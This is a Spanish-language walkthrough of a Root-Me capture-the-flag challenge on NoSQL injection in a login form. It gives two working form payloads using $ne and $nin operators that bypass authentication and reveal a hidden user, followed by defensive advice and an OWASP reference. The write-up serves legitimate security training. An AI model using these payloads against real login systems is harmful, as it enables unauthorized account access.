# Web - Server — NoSQL injection - Authentication

## Descripción

- **Puntos:** 35
- **Reto:** [Root-Me — NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)

Los campos de autenticación se convierten en objetos de consulta NoSQL. Operadores como `$ne` y `$nin` permiten modificar el filtro y elegir qué documento devuelve `findOne()`.

## Solución

1. Confirmar que los campos aceptan una estructura anidada con un operador NoSQL:

   ```text
   login[$ne]=t&pass[$ne]=a
   ```

2. Excluir las cuentas públicas conocidas para forzar que el primer documento coincidente sea el usuario oculto:

   ```text
   login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
   ```

3. Usar el nombre devuelto exclusivamente para validar en Root-Me.

## Estado de revalidación

El comportamiento del filtro y la técnica de exclusión fueron corroborados con análisis público. Falta repetirlo en la instancia Start autenticada, validar y registrar el «Like».

## Notas adicionales

- Los campos de autenticación deben aceptar únicamente cadenas y nunca objetos de consulta.
- Validar el esquema de la petición antes de construir una consulta y usar filtros explícitos del lado del servidor.
- La respuesta no se versiona.

## Referencias

- [Reto oficial](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
- [OWASP — NoSQL Injection](https://owasp.org/www-community/attacks/NoSQL_Injection)
